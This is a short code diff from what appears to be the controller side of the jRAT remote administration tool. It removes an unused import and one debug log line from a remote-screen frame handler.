@@ -6,7 +6,6 @@ import java.awt.image.BufferedImage;
 import java.io.DataInputStream;
 
 import se.jrat.client.Cursor;
-import se.jrat.client.Main;
 import se.jrat.client.Slave;
 import se.jrat.client.packets.outgoing.Packet12RemoteScreen;
 import se.jrat.client.ui.frames.FrameRemoteScreen;
@@ -48,7 +47,6 @@ public class Packet68RemoteScreenComplete extends AbstractIncomingPacket {
 				frame.drawOverlay(image);
 				frame.setBlockSizeLabel(frame.getTransmitted() / 1024);
 				frame.setChunksLabel(frame.getChunks());
-				Main.debug("Transmitted " + (frame.getTransmitted() / 1024) + " kb in one frame");
 				frame.setTransmitted(0);
 			}
             if (frame.isRunning()) {
